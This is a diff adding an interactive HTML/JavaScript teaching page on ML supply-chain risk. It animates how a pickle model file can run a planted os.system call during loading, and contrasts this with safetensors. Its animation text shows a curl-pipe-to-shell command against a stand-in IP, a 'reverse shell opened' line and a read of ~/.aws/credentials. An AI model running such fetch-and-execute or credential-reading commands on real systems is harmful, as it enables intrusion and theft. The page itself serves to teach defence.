@@ -1,0 +1,456 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Interactive: Loading a Model File Can Run Code</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#15171C;--ink2:#565a63;--ink3:#5c6270;--line:#e9eaee;--line2:#d9dbe2;
+  --bg:#ffffff;--paper:#f7f8fa;
+  --violet:#57068C;--violet2:#7a30ad;--vsoft:#f6effb;--vline:#e6d6f3;
+  --red:#c02626;--redline:#efc9c9;--redsoft:#fcf1f1;
+  --green:#0f7a43;--greenline:#c3e2d0;--greensoft:#eef7f2;
+  --mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
+  --sans:"Inter","Helvetica Neue",Arial,sans-serif;
+}
+*{box-sizing:border-box;margin:0}
+html,body{overflow:visible;height:auto}
+body{font-family:var(--sans);color:var(--ink);background:var(--bg);padding:16px;line-height:1.5;-webkit-font-smoothing:antialiased}
+.wrap{max-width:720px;margin:0 auto}
+.card{background:var(--bg);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.top{padding:18px 22px 4px}
+.eyebrow{font-family:var(--mono);font-size:0.75rem;font-weight:600;letter-spacing:.11em;text-transform:uppercase;color:var(--violet)}
+h1{font-size:1.22rem;font-weight:700;letter-spacing:-.021em;margin-top:7px;line-height:1.2}
+.lede{font-size:.85rem;color:var(--ink2);margin-top:8px;max-width:62ch}
+.body{padding:14px 22px 22px}
+.seg{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:6px}
+.segbtn{border:1px solid var(--line2);background:var(--bg);border-radius:12px;padding:11px 14px;cursor:pointer;text-align:left;transition:.16s;font-family:var(--sans)}
+.segbtn:hover{border-color:var(--violet2)}
+.segbtn[aria-pressed="true"]{border-color:var(--violet);box-shadow:inset 0 0 0 1px var(--violet)}
+.segbtn .fn{font-family:var(--mono);font-weight:600;font-size:.84rem;color:var(--ink);display:flex;align-items:center;gap:7px}
+.segbtn .fdot{width:8px;height:8px;border-radius:50%;background:var(--ink3);flex:none}
+.segbtn[aria-pressed="true"] .fdot{background:var(--violet)}
+.segbtn .fd{font-size:0.75rem;color:var(--ink2);margin-top:4px}
+.stagewrap{margin-top:12px;border:1px solid var(--line);border-radius:14px;background:linear-gradient(180deg,#ffffff,#fcfcfd);overflow:hidden;line-height:0}
+canvas{display:block;width:100%}
+.cap{min-height:1.35em;margin-top:12px;font-size:.83rem;color:var(--ink);display:flex;align-items:center;gap:9px}
+.cap .cstep{font-family:var(--mono);font-size:0.75rem;font-weight:700;letter-spacing:.05em;color:#fff;background:var(--violet);border-radius:5px;padding:3px 7px;flex:none}
+.cap.fired .cstep{background:var(--red)} .cap.done .cstep{background:var(--green)}
+.controls{margin-top:14px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.btn{font-family:var(--sans);font-size:.83rem;font-weight:600;padding:10px 20px;border-radius:10px;border:1px solid var(--violet);background:var(--violet);color:#fff;cursor:pointer;transition:.14s}
+.btn:hover{background:var(--violet2);border-color:var(--violet2)}
+.btn:disabled{background:var(--paper);border-color:var(--line2);color:var(--ink3);cursor:not-allowed}
+.rehint{font-size:0.75rem;color:var(--ink3)}
+.verdict{margin-top:14px;border:1px solid var(--line);border-left-width:3px;border-radius:10px;padding:0 15px;background:var(--bg);opacity:0;max-height:0;overflow:hidden;transition:.4s}
+/* Reveal caps raised. These boxes animate open with max-height and keep overflow:hidden, so any content taller than the cap was silently cut off. At 440px wide with a 20px root font the poison-lab verdict lost 46px of its explanation, which is the clipping reported in the first-round review. 1200px is far above any realistic verdict, so the box now sizes to content at every width and text scale. */
+.verdict.show{opacity:1;max-height:1200px;padding:13px 15px}
+.verdict .vk{font-family:var(--mono);font-size:0.75rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:5px}
+.verdict .vt{font-size:.85rem;color:var(--ink);line-height:1.5}
+.verdict .vt b{font-weight:700}
+.verdict.bad{border-color:var(--redline);border-left-color:var(--red)}
+.verdict.bad .vk{color:var(--red)}
+.verdict.good{border-color:var(--greenline);border-left-color:var(--green)}
+.verdict.good .vk{color:var(--green)}
+</style>
+</head>
+<body>
+<div class="wrap"><div class="card">
+  <div class="top">
+    <div class="eyebrow">Interactive · Section 3 · ML Supply Chain</div>
+    <h1>Loading a model file can run code</h1>
+    <p class="lede">Watch a model get rebuilt from a file, before it ever makes a prediction. Both formats load the same model. Only one of them can also be told to <i>run a command</i> while it loads.</p>
+  </div>
+  <div class="body">
+
+    <div class="seg" id="seg">
+      <button class="segbtn" data-f="pickle" aria-pressed="true">
+        <div class="fn"><span class="fdot"></span>model.bin</div>
+        <div class="fd">Pickle, a list of instructions</div>
+      </button>
+      <button class="segbtn" data-f="safe" aria-pressed="false">
+        <div class="fn"><span class="fdot"></span>model.safetensors</div>
+        <div class="fd">Safetensors, numbers only</div>
+      </button>
+    </div>
+
+    <div class="stagewrap"><canvas id="c"></canvas></div>
+
+    <div class="cap" id="cap"><span class="cstep" id="cstep">Ready</span><span id="captxt">Press Load. Follow the file into the loader on the left, and the model being built on the right.</span></div>
+
+    <div class="controls">
+      <button class="btn ghost" id="backBtn" disabled>◀ Back</button>
+      <button class="btn" id="nextBtn">Start ▶</button>
+      <button class="btn ghost" id="resetBtn">Reset</button>
+      <span class="rehint" id="rehint">Step through at your own pace.</span>
+    </div>
+
+    <div class="verdict" id="verdict"></div>
+  </div>
+</div></div>
+
+<script>
+(function(){
+const W=720,H=372;
+const canvas=document.getElementById('c'), ctx=canvas.getContext('2d');
+const seg=document.getElementById('seg'), backBtn=document.getElementById('backBtn'), nextBtn=document.getElementById('nextBtn'),
+      resetBtn=document.getElementById('resetBtn'), rehint=document.getElementById('rehint'),
+      capEl=document.getElementById('cap'), cstep=document.getElementById('cstep'), captxt=document.getElementById('captxt'),
+      verdict=document.getElementById('verdict');
+
+const C={ink:'#15171C',ink2:'#565a63',ink3:'#5c6270',line:'#e5e7ec',line2:'#d3d6dd',paper:'#f5f6f9',
+  violet:'#57068C',violet2:'#8a3fb8',vsoft:'#f3e9fb',teal:'#155e63',
+  red:'#cf2b2b',red2:'#ff7a4d',redsoft:'#fcecec',green:'#0f7a43',bg:'#ffffff'};
+
+if(!CanvasRenderingContext2D.prototype.roundRect){
+  CanvasRenderingContext2D.prototype.roundRect=function(x,y,w,h,r){r=Math.min(r,w/2,h/2);this.beginPath();
+    this.moveTo(x+r,y);this.arcTo(x+w,y,x+w,y+h,r);this.arcTo(x+w,y+h,x,y+h,r);
+    this.arcTo(x,y+h,x,y,r);this.arcTo(x,y,x+w,y,r);this.closePath();return this;};
+}
+const MONO="'JetBrains Mono',monospace", SANS="'Inter',sans-serif";
+
+let fmt='pickle', T=0, busy=false;
+const state=freshState();
+function freshState(){return{
+  stage:0, step:-1, done:[false,false,false], fired:false, ready:false,
+  token:null, plates:[], bars:[0,0], modelMode:'idle',
+  machineShake:0, machineRed:0, machineGlow:0,
+  callBadge:0, bolt:0, shell:0, termReveal:0, chipGlow:0, beam:null,
+  particles:[]
+};}
+
+/* ---------- geometry ---------- */
+const RAIL_Y=30, RAIL_X=[150,360,570];
+const FILE={x:26,y:150,w:48,h:62};
+const BELT={x0:86,y:213};
+const MACH={x:236,y:146,w:166,h:150}; const MACH_CX=MACH.x+MACH.w/2, MACH_TOP=MACH.y;
+const INTAKE={x:MACH.x+6,y:213};
+const OUT={x:MACH.x+MACH.w,y:213};
+const MODEL={x:470,y:146,w:216,h:150};
+
+/* ---------- helpers ---------- */
+function easeIO(p){return p<.5?2*p*p:1-Math.pow(-2*p+2,2)/2;}
+function easeOut(p){return 1-Math.pow(1-p,3);}
+function tween(o,to,dur,ease){ease=ease||easeIO;return new Promise(res=>{const f={};for(const k in to)f[k]=o[k];const t0=performance.now();
+  (function fr(now){let p=Math.min(1,(now-t0)/dur),e=ease(p);for(const k in to)o[k]=f[k]+(to[k]-f[k])*e;if(p<1)requestAnimationFrame(fr);else res();})(performance.now());});}
+function wait(ms){return new Promise(r=>setTimeout(r,ms));}
+function mix(a,b,t){const pa=hx(a),pb=hx(b);return 'rgb('+Math.round(pa[0]+(pb[0]-pa[0])*t)+','+Math.round(pa[1]+(pb[1]-pa[1])*t)+','+Math.round(pa[2]+(pb[2]-pa[2])*t)+')';}
+function hx(h){h=h.replace('#','');return[parseInt(h.slice(0,2),16),parseInt(h.slice(2,4),16),parseInt(h.slice(4,6),16)];}
+function noShadow(){ctx.shadowColor='transparent';ctx.shadowBlur=0;ctx.shadowOffsetY=0;}
+function shadow(c,b,y){ctx.shadowColor=c;ctx.shadowBlur=b;ctx.shadowOffsetY=y||0;}
+function roundTop(x,y,w,h,r){ctx.beginPath();ctx.moveTo(x,y+h);ctx.lineTo(x,y+r);ctx.arcTo(x,y,x+r,y,r);ctx.lineTo(x+w-r,y);ctx.arcTo(x+w,y,x+w,y+r,r);ctx.lineTo(x+w,y+h);ctx.closePath();}
+function label(txt,x,y,col){ctx.fillStyle=col||C.ink3;ctx.font='700 12px '+MONO;ctx.textAlign='center';ctx.textBaseline='top';ctx.fillText(txt,x,y);}
+
+/* ---------- scene ---------- */
+function drawRail(){
+  ctx.strokeStyle=C.line2;ctx.lineWidth=2;ctx.beginPath();ctx.moveTo(RAIL_X[0],RAIL_Y);ctx.lineTo(RAIL_X[2],RAIL_Y);ctx.stroke();
+  const L=['Read file','Rebuild objects','Run inference'];
+  for(let i=0;i<3;i++){const x=RAIL_X[i],active=state.stage===i&&state.step>=0&&!state.fired&&!state.ready,done=state.done[i];
+    let ring=C.line2,fill=C.bg,txt=C.ink3;
+    if(done){ring=C.violet;txt=C.violet;} if(active){ring=C.violet;fill=C.vsoft;txt=C.violet;}
+    if(i===1&&state.fired){ring=C.red;fill=C.redsoft;txt=C.red;}
+    if(i===2&&state.ready){ring=C.green;fill=C.greensoft||'#eef7f2';txt=C.green;}
+    if(i===2&&state.fired){ring=C.line2;txt=C.ink3;fill=C.bg;}
+    ctx.beginPath();ctx.arc(x,RAIL_Y,14,0,7);ctx.fillStyle=fill;ctx.fill();ctx.lineWidth=2.4;ctx.strokeStyle=ring;ctx.stroke();
+    ctx.fillStyle=txt;ctx.font='700 12px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText(String(i+1),x,RAIL_Y+1);
+    ctx.font='600 12px '+SANS;ctx.fillStyle=(active||done||(i===2&&state.ready))?C.ink:C.ink3;ctx.textBaseline='top';ctx.fillText(L[i],x,RAIL_Y+22);}
+}
+function drawBelt(){
+  ctx.strokeStyle=C.line2;ctx.lineWidth=2;ctx.beginPath();ctx.moveTo(BELT.x0,BELT.y+18);ctx.lineTo(INTAKE.x+6,BELT.y+18);ctx.stroke();
+  ctx.save();ctx.strokeStyle='#cbced6';ctx.lineWidth=3;ctx.setLineDash([9,9]);ctx.lineDashOffset=-(T*0.9%18);
+  ctx.beginPath();ctx.moveTo(BELT.x0,BELT.y+18);ctx.lineTo(INTAKE.x+6,BELT.y+18);ctx.stroke();ctx.restore();
+}
+function drawFile(){
+  const f=FILE;shadow('rgba(20,20,30,.10)',10,4);ctx.fillStyle=C.bg;ctx.strokeStyle=C.line2;ctx.lineWidth=1.5;
+  ctx.beginPath();ctx.roundRect(f.x,f.y,f.w,f.h,8);ctx.fill();noShadow();ctx.stroke();
+  ctx.fillStyle=fmt==='pickle'?C.vsoft:'#eef2f5';ctx.beginPath();ctx.moveTo(f.x+f.w-15,f.y);ctx.lineTo(f.x+f.w,f.y+15);ctx.lineTo(f.x+f.w-15,f.y+15);ctx.closePath();ctx.fill();
+  ctx.strokeStyle=fmt==='pickle'?C.violet2:C.teal;ctx.lineWidth=2;
+  for(let i=0;i<4;i++){ctx.beginPath();ctx.moveTo(f.x+9,f.y+25+i*9);ctx.lineTo(f.x+f.w-9-(i%2?7:0),f.y+25+i*9);ctx.stroke();}
+  label('FILE',f.x+f.w/2,f.y+f.h+8,C.ink3);
+}
+function drawMachine(){
+  const m=MACH,sx=Math.sin(T*3)*state.machineShake;ctx.save();ctx.translate(sx,0);
+  const g=ctx.createLinearGradient(0,m.y,0,m.y+m.h);g.addColorStop(0,'#ffffff');g.addColorStop(1,'#eef0f4');
+  shadow('rgba(20,20,30,.12)',18,8);ctx.fillStyle=g;ctx.beginPath();ctx.roundRect(m.x,m.y,m.w,m.h,16);ctx.fill();noShadow();
+  ctx.lineWidth=1.5;ctx.strokeStyle=state.machineRed>0?mix(C.line2,C.red,state.machineRed):C.line2;ctx.stroke();
+  if(state.machineRed>0){ctx.save();ctx.globalAlpha=state.machineRed*.5;const rg=ctx.createRadialGradient(MACH_CX,m.y+m.h/2,4,MACH_CX,m.y+m.h/2,95);rg.addColorStop(0,'#ff5a3c');rg.addColorStop(1,'rgba(255,90,60,0)');ctx.fillStyle=rg;ctx.beginPath();ctx.roundRect(m.x,m.y,m.w,m.h,16);ctx.fill();ctx.restore();}
+  ctx.fillStyle=state.machineRed>0?mix(C.violet,C.red,state.machineRed):C.violet;roundTop(m.x,m.y,m.w,26,16);ctx.fill();
+  ctx.fillStyle='#fff';ctx.font='700 12px '+MONO;ctx.textAlign='left';ctx.textBaseline='middle';ctx.fillText('THE  LOADER',m.x+14,m.y+13);
+  ctx.fillStyle='#0d0f14';ctx.beginPath();ctx.roundRect(m.x-3,INTAKE.y-12,11,24,4);ctx.fill();
+  const gy=m.y+m.h-30, spin=T*(state.machineGlow>0?9:3);
+  drawGear(m.x+30,gy,15,spin,state.machineRed>0?C.red:C.violet2);
+  drawGear(m.x+56,gy,10,-spin,C.line2);
+  ctx.restore();
+}
+function drawGear(cx,cy,r,rot,col){ctx.save();ctx.translate(cx,cy);ctx.rotate(rot*Math.PI/180);ctx.fillStyle=col;const t=8;ctx.beginPath();
+  for(let i=0;i<t;i++){const a=i/t*6.283,a2=(i+.5)/t*6.283;ctx.lineTo(Math.cos(a)*r,Math.sin(a)*r);ctx.lineTo(Math.cos(a+.18)*r*1.3,Math.sin(a+.18)*r*1.3);ctx.lineTo(Math.cos(a2)*r,Math.sin(a2)*r);}
+  ctx.closePath();ctx.fill();ctx.fillStyle='#fff';ctx.beginPath();ctx.arc(0,0,r*.4,0,7);ctx.fill();ctx.restore();}
+
+function drawPlates(){
+  for(const p of state.plates){ctx.save();ctx.globalAlpha=p.alpha;shadow('rgba(20,20,30,.14)',9,4);
+    ctx.fillStyle='#fff';ctx.beginPath();ctx.roundRect(p.x-p.w/2,p.y-13,p.w,26,7);ctx.fill();noShadow();
+    ctx.lineWidth=2;ctx.strokeStyle=p.color;ctx.stroke();
+    ctx.fillStyle=p.color;ctx.beginPath();ctx.roundRect(p.x-p.w/2+6,p.y-8,16,16,4);ctx.fill();
+    ctx.fillStyle='#fff';ctx.font='700 12px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText(p.glyph,p.x-p.w/2+14,p.y+1);
+    ctx.fillStyle=C.ink;ctx.font='600 12px '+MONO;ctx.textAlign='left';ctx.fillText(p.label,p.x-p.w/2+28,p.y+1);
+    if(p.planted){ctx.fillStyle=C.red;ctx.font='700 12px '+MONO;ctx.textAlign='right';ctx.fillText('⚠ planted',p.x+p.w/2-8,p.y+1);}
+    ctx.restore();}
+}
+function drawToken(){const t=state.token;if(!t)return;ctx.save();ctx.globalAlpha=t.alpha;ctx.translate(t.x,t.y);ctx.scale(t.scale,t.scale);shadow('rgba(20,20,30,.16)',12,5);
+  if(t.kind==='weight'){ctx.fillStyle=C.violet;ctx.beginPath();ctx.roundRect(-16,-15,32,30,7);ctx.fill();noShadow();ctx.fillStyle='#fff';ctx.font='700 13px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText(t.glyph||'#',0,1);}
+  else if(t.kind==='header'){ctx.fillStyle='#fff';ctx.beginPath();ctx.roundRect(-18,-15,36,30,7);ctx.fill();noShadow();ctx.lineWidth=2;ctx.strokeStyle=C.ink3;ctx.stroke();ctx.fillStyle=C.ink2;ctx.font='700 13px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText('≡',0,1);}
+  else if(t.kind==='reduce'){ctx.fillStyle=C.red;ctx.beginPath();ctx.roundRect(-40,-15,80,30,8);ctx.fill();noShadow();ctx.fillStyle='#fff';ctx.font='700 12px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText('REDUCE',0,1);}
+  else{ctx.fillStyle='#fff';ctx.beginPath();ctx.roundRect(-19,-16,38,32,8);ctx.fill();noShadow();ctx.lineWidth=2;ctx.strokeStyle=t.color;ctx.stroke();ctx.fillStyle=t.color;ctx.font='700 15px '+MONO;ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText(t.glyph,0,1);}
+  ctx.restore();}
+
+function drawBeam(){if(!state.beam)return;const b=state.beam;ctx.save();ctx.globalAlpha=b.a;ctx.strokeStyle=C.violet2;ctx.lineWidth=3;shadow(C.violet2,8,0);
+  const x=b.x0+(b.x1-b.x0)*b.p;ctx.beginPath();ctx.moveTo(b.x0,b.y);ctx.lineTo(x,b.y);ctx.stroke();
+  ctx.fillStyle=C.violet;ctx.beginPath();ctx.arc(x,b.y,4,0,7);ctx.fill();ctx.restore();noShadow();}
+
+function drawModel(){
+  const m=MODEL;shadow('rgba(20,20,30,.10)',16,6);ctx.fillStyle='#fff';ctx.beginPath();ctx.roundRect(m.x,m.y,m.w,m.h,16);ctx.fill();noShadow();
+  ctx.lineWidth=1.5;ctx.strokeStyle=state.ready?C.green:(state.fired?'#efc9c9':C.line2);ctx.stroke();
+  ctx.fillStyle=C.ink;ctx.font='700 12px '+MONO;ctx.textAlign='left';ctx.textBaseline='middle';ctx.fillText('MODEL',m.x+14,m.y+15);
+  let stat='loading weights…',sc=C.ink3;
+  if(state.modelMode==='ready'){stat='READY';sc=C.green;} else if(state.modelMode==='interrupt'){stat='HIJACKED';sc=C.red;} else if(state.modelMode==='idle'){stat='waiting';sc=C.ink3;}
+  ctx.fillStyle=sc;ctx.font='700 12px '+MONO;ctx.textAlign='right';ctx.fillText(stat,m.x+m.w-14,m.y+15);
+  // a small neural network: nodes joined by connections; the WEIGHTS are the numbers on the connections
+  const accent=state.ready?C.green:C.violet;
+  const counts=[3,4,3], cx=[m.x+54,m.x+108,m.x+162], yTop=m.y+42, yBot=m.y+114;
+  const pos=counts.map((n,ci)=>{const a=[];for(let k=0;k<n;k++){a.push({x:cx[ci],y:yTop+(yBot-yTop)*k/(n-1)});}return a;});
+  function bundle(A,B,lit){for(const a of A)for(const b of B){ctx.strokeStyle=lit>0?accent:'#e6e8ee';ctx.globalAlpha=lit>0?(.2+.6*lit):1;ctx.lineWidth=1.2;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.stroke();}ctx.globalAlpha=1;}
+  bundle(pos[0],pos[1],state.bars[0]); bundle(pos[1],pos[2],state.bars[1]);
+  const lit=[state.bars[0]>0, state.bars[0]>0||state.bars[1]>0, state.bars[1]>0];
+  pos.forEach((col,ci)=>col.forEach(nd=>{ctx.beginPath();ctx.arc(nd.x,nd.y,6,0,7);ctx.fillStyle=lit[ci]?accent:'#e2e5eb';ctx.fill();ctx.lineWidth=1.4;ctx.strokeStyle=lit[ci]?accent:C.line2;ctx.stroke();}));
+  ctx.fillStyle=C.ink2;ctx.font='600 12px '+SANS;ctx.textAlign='center';ctx.textBaseline='top';
+  ctx.fillText('weights = the numbers on the connections',m.x+m.w/2,m.y+m.h-22);
+  if(state.ready){ctx.save();ctx.globalAlpha=(.35+.25*Math.sin(T*3.5))*state.chipGlow;const rg=ctx.createRadialGradient(m.x+m.w/2,m.y+m.h/2,10,m.x+m.w/2,m.y+m.h/2,120);rg.addColorStop(0,'#39c98a');rg.addColorStop(1,'rgba(57,201,138,0)');ctx.fillStyle=rg;ctx.beginPath();ctx.roundRect(m.x,m.y,m.w,m.h,16);ctx.fill();ctx.restore();}
+  label('the model being rebuilt',m.x+m.w/2,m.y+m.h+8,C.ink3);
+}
+
+function drawCallBadge(){
+  if(state.callBadge<=0)return;const a=state.callBadge;const bw=250,bh=52,x=MACH_CX-bw/2,y=MACH.y+64;
+  ctx.save();ctx.globalAlpha=Math.min(1,a);const s=.85+.15*Math.min(1,a);ctx.translate(MACH_CX,y+bh/2);ctx.scale(s,s);ctx.translate(-MACH_CX,-(y+bh/2));
+  shadow('rgba(207,43,43,.35)',20,8);ctx.fillStyle=C.red;ctx.beginPath();ctx.roundRect(x,y,bw,bh,12);ctx.fill();noShadow();
+  ctx.textAlign='center';ctx.textBaseline='middle';
+  ctx.fillStyle='#ffd9d0';ctx.font='700 12px '+MONO;ctx.fillText('REDUCE  =  "CALL A FUNCTION"',MACH_CX,y+15);
+  ctx.fillStyle='#fff';ctx.font='700 13px '+MONO;ctx.fillText('os.system("curl…|sh")',MACH_CX,y+35);
+  ctx.restore();
+}
+function drawBolt(){if(state.bolt<=0)return;const x0=OUT.x,x1=MODEL.x,y=213,x=x0+(x1-x0)*state.bolt;
+  ctx.save();ctx.strokeStyle=C.red2;ctx.lineWidth=3;shadow(C.red2,10,0);ctx.beginPath();ctx.moveTo(x0,y);let px=x0,up=true;
+  while(px<x){const nx=Math.min(px+11,x);ctx.lineTo(nx,y+(up?-7:7));up=!up;px=nx;}ctx.stroke();ctx.restore();noShadow();}
+
+function drawShell(){
+  if(state.shell<=0)return;const m=MODEL;ctx.save();ctx.globalAlpha=Math.min(1,state.shell);
+  const s=.86+.14*Math.min(1,state.shell);ctx.translate(m.x+m.w/2,m.y+m.h/2);ctx.scale(s,s);ctx.translate(-(m.x+m.w/2),-(m.y+m.h/2));
+  shadow('rgba(207,43,43,.30)',22,8);ctx.fillStyle='#14161c';ctx.beginPath();ctx.roundRect(m.x,m.y,m.w,m.h,14);ctx.fill();noShadow();
+  ctx.fillStyle='#20242e';roundTop(m.x,m.y,m.w,24,14);ctx.fill();
+  const dc=['#ff5f57','#febc2e','#28c840'];for(let i=0;i<3;i++){ctx.fillStyle=dc[i];ctx.beginPath();ctx.arc(m.x+16+i*14,m.y+12,4,0,7);ctx.fill();}
+  ctx.fillStyle='#8b9099';ctx.font='600 12px '+MONO;ctx.textAlign='left';ctx.textBaseline='middle';ctx.fillText('shell  ·  spawned by the loader',m.x+62,m.y+12);
+  ctx.save();ctx.beginPath();ctx.rect(m.x+12,m.y+30,m.w-24,m.h-40);ctx.clip();
+  const lines=[['#7be0a8','$ curl 198.51.100.7 | sh'],['#ff8a8a','> reverse shell opened'],['#ff8a8a','> read ~/.aws/credentials']];
+  ctx.font='500 12px '+MONO;ctx.textAlign='left';
+  for(let i=0;i<3;i++){const rv=state.termReveal-i;if(rv<=0)continue;const full=lines[i][1],n=Math.floor(Math.min(1,rv)*full.length);
+    ctx.fillStyle=lines[i][0];ctx.fillText(full.slice(0,n),m.x+14,m.y+46+i*20);}
+  if(state.termReveal>=3&&Math.floor(T*1.7)%2===0){ctx.fillStyle='#7be0a8';ctx.fillRect(m.x+14,m.y+m.h-30,7,12);}
+  ctx.restore();ctx.restore();
+}
+
+function updateParticles(){for(const p of state.particles){p.vy+=.12;p.x+=p.vx;p.y+=p.vy;p.life-=.02;}state.particles=state.particles.filter(p=>p.life>0);}
+function drawParticles(){for(const p of state.particles){ctx.save();ctx.globalAlpha=Math.max(0,p.life);ctx.fillStyle=p.c;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,7);ctx.fill();ctx.restore();}}
+function burst(x,y){for(let i=0;i<44;i++){const a=Math.random()*6.283,s=1.5+Math.random()*5;state.particles.push({x,y,vx:Math.cos(a)*s,vy:Math.sin(a)*s-2,r:1.4+Math.random()*2.4,life:.7+Math.random()*.5,c:Math.random()<.5?C.red2:'#ffb27a'});}}
+
+function draw(){ctx.clearRect(0,0,W,H);drawRail();drawBelt();drawFile();drawMachine();drawModel();drawBeam();drawPlates();drawCallBadge();drawBolt();drawShell();drawToken();drawParticles();}
+function loop(){T+=1/60;updateParticles();draw();requestAnimationFrame(loop);}
+
+/* ---------- choreography ---------- */
+const PICKLE=[
+ {act:'weight',bar:0,num:'W1',step:'STEP 1',cap:'A pickle file is a list of instructions. First it loads a batch of the model’s weights, the numbers a model learns, shown as the connections lighting up.'},
+ {act:'weight',bar:1,num:'W2',step:'STEP 2',cap:'A second instruction loads the rest of the weights. The network is complete. An ordinary model, so far.'},
+ {act:'push',kind:'fn',glyph:'ƒ',label:'os.system',planted:true,step:'STEP 3',cap:'Now an instruction an attacker planted: load a reference to the function os.system.'},
+ {act:'push',kind:'str',glyph:'”',label:'"curl…"',planted:true,step:'STEP 4',cap:'And its argument: a shell command that downloads and runs a script.'},
+ {act:'call',step:'STEP 5',cap:'REDUCE is a pickle instruction that means "call a function." Pickle uses it to rebuild objects, but here it calls os.system, so the command runs.'}
+];
+const SAFE=[
+ {act:'header',step:'STEP 1',cap:'Safetensors opens with a header that only lists what is inside: the weight names, their shapes, and where the numbers sit in the file.'},
+ {act:'weight',bar:0,num:'W1',step:'STEP 2',cap:'The loader copies the first batch of the model’s weights into memory. Just numbers, no instruction to run.'},
+ {act:'weight',bar:1,num:'W2',step:'STEP 3',cap:'The last batch of weights loads. The model is complete, and nothing ever executed.'}
+];
+
+function setCap(step,txt,cls){cstep.textContent=step;captxt.textContent=txt;capEl.className='cap'+(cls?' '+cls:'');}
+
+async function spawnToken(kind,glyph,color){
+  state.token={x:FILE.x+FILE.w/2,y:FILE.y+FILE.h/2,kind:kind,glyph:glyph,color:color||C.violet,alpha:0,scale:.6};
+  await tween(state.token,{alpha:1,scale:1,y:BELT.y},240,easeOut);
+  await tween(state.token,{x:INTAKE.x+4},600,easeIO);
+}
+async function loadWeight(bar){
+  // token disappears into machine, a beam carries it to the model bar
+  await tween(state.token,{x:MACH_CX,alpha:0,scale:.5},280,easeIO);state.token=null;
+  state.machineGlow=1;
+  const cxs=[MODEL.x+54,MODEL.x+108,MODEL.x+162];
+  const tx=bar===0?(cxs[0]+cxs[1])/2:(cxs[1]+cxs[2])/2;
+  const by=(MODEL.y+42+MODEL.y+114)/2;
+  state.beam={x0:OUT.x,x1:tx,y:by,p:0,a:1};
+  await tween(state.beam,{p:1},420,easeOut);
+  state.beam.a=0;state.beam=null;
+  await tween(state.bars,{[bar]:1},480,easeOut);
+  state.machineGlow=0;
+}
+async function pushPlate(t){
+  const idx=state.plates.length,py=MACH_TOP-16-idx*30;
+  const p={x:MACH_CX,y:INTAKE.y,w:150,glyph:t.glyph,label:t.label,color:C.red,planted:true,alpha:0};
+  state.plates.push(p);
+  await Promise.all([tween(state.token,{alpha:0,scale:.5},200),tween(p,{alpha:1},200)]);state.token=null;
+  await tween(p,{y:py},360,easeOut);
+}
+async function fireCall(){
+  // the REDUCE instruction arrives, then the two planted plates collapse into one CALL
+  if(state.token){await tween(state.token,{x:MACH_CX,alpha:0,scale:.5},240,easeIO);state.token=null;}
+  const pulls=state.plates.map(p=>tween(p,{y:MACH.y+70,alpha:0,w:60},280,easeIO));
+  await Promise.all(pulls);state.plates=[];
+  state.machineGlow=1;await tween(state,{machineRed:1,callBadge:1},340,easeOut);
+  state.fired=true;state.done[0]=true;state.machineShake=3.5;tween(state,{machineShake:0},420);
+  await wait(700);
+  await tween(state,{bolt:1},320,easeOut);state.bolt=0;
+  state.modelMode='interrupt';
+  burst(MODEL.x+14,213);
+  await tween(state,{shell:1,callBadge:.0},280,easeOut);
+  await tween(state,{termReveal:3},1100);
+  await wait(300);
+}
+
+function stepsArr(){return fmt==='pickle'?PICKLE:SAFE;}
+function maxStep(){return stepsArr().length-1;}
+
+function snapTo(n){ // instantly set the scene to reflect steps 0..n completed (no animation)
+  state.token=null;state.beam=null;state.particles=[];
+  state.callBadge=0;state.bolt=0;state.shell=0;state.termReveal=0;
+  state.machineRed=0;state.machineShake=0;state.machineGlow=0;
+  state.bars=[0,0];state.plates=[];state.fired=false;state.ready=false;state.chipGlow=0;state.done=[false,false,false];
+  const S=stepsArr();let pushIdx=0,anyW=false;
+  for(let i=0;i<=n&&i<S.length;i++){const t=S[i];
+    if(t.act==='weight'){state.bars[t.bar]=1;anyW=true;}
+    else if(t.act==='push'){const py=MACH_TOP-16-pushIdx*30;pushIdx++;state.plates.push({x:MACH_CX,y:py,w:150,glyph:t.glyph,label:t.label,color:C.red,planted:true,alpha:1});}
+    else if(t.act==='call'){state.plates=[];state.fired=true;state.machineRed=1;state.shell=1;state.termReveal=3;state.modelMode='interrupt';state.done=[true,false,false];}
+  }
+  if(state.fired){state.stage=1;}
+  else{state.modelMode=(n<0?'idle':'rebuilding');state.stage=fmt==='pickle'?1:0;}
+}
+
+async function animateStep(t){
+  if(t.act==='weight'){await spawnToken('weight',t.num);await loadWeight(t.bar);}
+  else if(t.act==='header'){await spawnToken('header');await tween(state.token,{x:MACH_CX,alpha:0,scale:.5},340);state.token=null;}
+  else if(t.act==='push'){await spawnToken(t.kind,t.glyph,C.red);await pushPlate(t);}
+  else if(t.act==='call'){await spawnToken('reduce','REDUCE',C.red);await fireCall();}
+}
+
+function showVerdict(){
+  if(fmt==='pickle'){state.done=[true,false,false];
+    verdict.className='verdict bad show';
+    verdict.innerHTML='<div class="vk">Code ran before inference</div><div class="vt">Pickle can rebuild <i>any</i> Python object, and it does that with one instruction, <b>REDUCE</b>, that means "call this function with these arguments." That is handy for legitimate objects, but the function can be <i>anything</i>, including <b>os.system</b>. The planted instructions ran a shell command at <b>Stage 2</b>, before the model produced a single output. <b>A model file from an untrusted source is untrusted code.</b></div>';
